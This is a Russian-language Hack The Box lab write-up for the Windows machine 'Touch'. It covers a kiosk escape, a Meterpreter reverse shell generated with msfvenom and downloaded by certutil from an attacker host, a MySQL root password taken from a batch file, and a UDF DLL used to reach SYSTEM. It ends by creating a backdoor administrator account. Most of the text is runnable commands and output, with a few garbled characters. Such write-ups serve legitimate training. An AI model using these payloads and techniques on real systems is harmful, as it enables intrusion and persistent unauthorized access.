# Touch (HTB)

> Платформа: Hack The Box  
> Сезон: 12 / Aero  
> ОС: Windows 11 24H2+ (Build 26100)  
> Сложность: Easy  
> Результат: nt authority\system

---

## Attack Chain

```text
Reconnaissance
├── nmap -sV -sC 10.129.71.63 → 135 (RPC), 3389 (RDP), 5985 (WinRM), 8443 (Nexion DeviceHub)
├── ffuf /FUZZ → /login (200), /api (403)
└── ffuf /api/FUZZ → /api/status → serial NX-DH-2024-B7042

Foothold (DeviceHub → RDP)
├── /login → password = serial (NX-DH-2024-B7042)
├── Найдены креды: KioskUser / K!0sk2026#
├── xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.71.63
└── Kiosk HTB Airways

Kiosk Escape
├── Booking Ref: KS7X2M / Last Name: CRAWFORD
├── DOCUMENT VERIFICATION → Scan → ошибка
├── DeviceHub → выключить сканер
├── Scan → новая ошибка с кликабельной ссылкой
├── Клик → браузер вне киоска
├── Ctrl+O → C:\Windows\System32\cmd.exe
└── shell: kiosk-042\kioskuser → type user.txt → <USER_FLAG>

Shell Upgrade (Meterpreter)
├── msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=4445 -f exe -o shell.exe
├── python3 -m http.server 8000
├── msfconsole → multi/handler
├── certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
└── shell.exe → Meterpreter session

Privilege Check
├── getuid → KIOSK-042\KioskUser
├── sysinfo → Windows 11 24H2+ (Build 26100)
├── whoami /priv → без SeImpersonatePrivilege
└── whoami /groups → Printer Administrators, RDP Users, Users

Enumeration (Source Code)
├── C:\Program Files\HTB Airways\Kiosk\ (Node/Express/React)
├── C:\Program Files\Nexion Systems\DocReader\ (.NET DeviceHub)
├── C:\Program Files\Nexion Systems\Printer\
├── C:\MySQL\ (MySQL Server 8.0)
├── document-service.ts → OCR MRZ (tesseract.js)
├── staff.ts → QR HTBAW-STAFF:<email>:<authCode>
├── database/index.ts → kiosk_app:K!0sk_R3pl1ca#DB
└── MySQL → SELECT * FROM _htb_staff

Credential Leak (MySQL root)
├── C:\ProgramData\HTB Airways\db-config.ini
├── C:\ProgramData\HTB Airways\refresh-dates.bat
│   └── -u root -pHTB@irw4ys_DB!2026
├── SELECT user, host, Grant_priv, File_priv FROM mysql.user → root:Y:Y
└── icacls C:\MySQL\lib\plugin → Authenticated Users:(M)

Privilege Escalation (MySQL UDF Hijacking)
├── meterpreter upload lib_mysqludf_sys_64.dll → C:\MySQL\lib\plugin\
├── CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll'
├── SELECT sys_eval('whoami') → nt authority\system
├── SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt') → <ROOT_FLAG>
└── Опционально: net user hacker /add → Administrators → RDP/WinRM
```

---

## Machine Briefing

В описании машины **Layover** (предшествующей) были найдены имя и код бронирования:

```
Jenny Crawford / KS7X2M
```

---

## Reconnaissance

```bash
nmap -sV -sC 10.129.71.63
```

| Порт | Сервис                                    |
|------|-------------------------------------------|
| 135  | Microsoft Windows RPC                     |
| 3389 | Microsoft Terminal Service (RDP)          |
| 5985 | Microsoft HTTPAPI httpd 2.0 (WinRM)       |
| 8443 | Microsoft HTTPAPI httpd 2.0 — Nexion DeviceHub |

Порт 8443 — **Nexion DeviceHub - Login**.

---

## Веб-разведка

```bash
ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
# /login (200), /api (403)

ffuf -u http://10.129.71.63:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
# /api/status
```

`/api/status` отдаёт:

```json
{"serial":"NX-DH-2024-B7042","status":"online", ...}
```

---

## Foothold (DeviceHub → RDP)

Подсказка на `/login`: *«default device password is its own serial number»*.

Пароль:

```
NX-DH-2024-B7042
```

В панели DeviceHub:

```
KioskUser / K!0sk2026#
```

### RDP

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.71.63 /clipboard /dynamic-resolution
```

Полноэкранный киоск HTB Airways.

---

## Kiosk Escape

### Ввод брони

```
Booking Ref: KS7X2M
Last Name: CRAWFORD
```

Экран DOCUMENT VERIFICATION → **Scan** → ошибка.

### Манипуляция оборудованием

DeviceHub → выключить сканер → повтор поиска → Scan → другая ошибка с **кликабельной ссылкой**.

### Побег

Клик по ссылке открывает полноценный браузер вне киоска.

**Ctrl+O** → `C:\Windows\System32\cmd.exe`.

Shell от:

```
kiosk-042\kioskuser
```

### User flag

```cmd
type C:\Users\KioskUser\Desktop\user.txt
```

```
<USER_FLAG>
```

---

## Shell Upgrade (Meterpreter)

```bash
ip a
mkdir -p /tmp/share && cd /tmp/share
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=4445 -f exe -o /tmp/share/shell.exe
python3 -m http.server 8000
```

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.82; set LPORT 4445; exploit"
```

�-агрузка и запуск:

```cmd
certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
C:\Users\KioskUser\Desktop\shell.exe
```

```
[*] Meterpreter session 1 opened (10.10.14.82:4445 -> 10.129.76.83:xxxxx)
```

---

## Privilege Check

```
meterpreter > getuid
Server username: KIOSK-042\KioskUser

meterpreter > sysinfo
Computer : KIOSK-042
OS       : Windows 11 24H2+ (10.0 Build 26100)
Arch     : x64
```

```cmd
whoami /priv
whoami /groups
```

**Привилегии:** `SeChangeNotifyPrivilege`, `SeUndockPrivilege`, `SeIncreaseWorkingSetPrivilege`, `SeTimeZonePrivilege`.

**Группы:** `KIOSK-042\Printer Administrators`, `BUILTIN\Remote Desktop Users`, `BUILTIN\Users`.

**`SeImpersonatePrivilege` отсутствует** — JuicyPotato/PrintSpoofer/GodPotato не подходят.

---

## Enumeration (Source Code)

```cmd
dir "C:\Program Files\HTB Airways\Kiosk\"
dir "C:\Program Files\Nexion Systems\DocReader\"
dir "C:\Program Files\Nexion Systems\Printer\"
dir C:\MySQL\
```

| Путь | Описание |
|------|----------|
| `C:\Program Files\HTB Airways\Kiosk\` | Node/Express/React kiosk app |
| `C:\Program Files\Nexion Systems\DocReader\` | .NET DeviceHub backend (порт 8443) |
| `C:\Program Files\Nexion Systems\Printer\` | .NET printer service |
| `C:\MySQL\` | MySQL Server 8.0 |

```cmd
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\services\document-service.ts"
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\routes\staff.ts"
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

Ключевое:

- `document-service.ts` — OCR MRZ через tesseract.js.
- `staff.ts` — декод QR `HTBAW-STAFF:<email>:<authCode>`, проверка в `_htb_staff`.

**Креды MySQL из `database/index.ts`:**

```
host: 127.0.0.1
port: 3306
user: kiosk_app
password: K!0sk_R3pl1ca#DB
database: htb_airways
```

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
```

---

## Поиск root-пароля MySQL

```cmd
type "C:\ProgramData\HTB Airways\db-config.ini"
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
type "C:\ProgramData\HTB Airways\refresh-dates.sql"
```

`refresh-dates.bat`:

```bat
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql"
```

---

## Проверка прав root

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
```

```
root  localhost  Y  Y
```

`File_priv = Y` → UDF hijacking возможен.

```powershell
icacls "C:\MySQL\lib\plugin"
```

```
NT AUTHORITY\Authenticated Users:(I)(M)
```

`M` — `KioskUser` может писать в директорию плагинов.

---

## Privilege Escalation (MySQL UDF Hijacking)

�-агрузка DLL:

```
meterpreter > upload /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
```

Или через certutil:

```powershell
certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Создание функции:

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

Проверка:

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
# nt authority\system
```

**Механика:** MySQL как служба Windows работает от `NT AUTHORITY\SYSTEM`. UDF `sys_eval` из загруженной DLL даёт выполнение shell-команд через SQL-запросы с теми же привилегиями.

---

## Root flag

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
```

```
<ROOT_FLAG>
```

### Опционально — интерактивный SYSTEM

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('net user hacker P@ssw0rd123! /add');"
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('net localgroup Administrators hacker /add');"
```

Далее — RDP/WinRM как `hacker`.

---

## Flags

| Флаг | �-начение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Утечка серийного номера через `/api/status` без аутентификации** — пароль от DeviceHub.
- **Kiosk escape через манипуляцию состоянием оборудования** — выключение сканера в панели админа → новая ошибка с кликабельной ссылкой.
- **Ctrl+O как universal escape hatch** — диалог Open File даёт доступ к проводнику и запуск `cmd.exe`.
- **Пароли в открытом виде в .bat/.sql** — `refresh-dates.bat` содержит root-пароль MySQL.
- **MySQL File_priv + writable plugin directory = RCE** — UDF hijacking.
- **MySQL как служба Windows запускается от SYSTEM** — компрометация СУБД с UDF напрямую даёт SYSTEM.
- **Отсутствие SeImpersonatePrivilege не тупик** — ищем альтернативные векторы через локальные сервисы.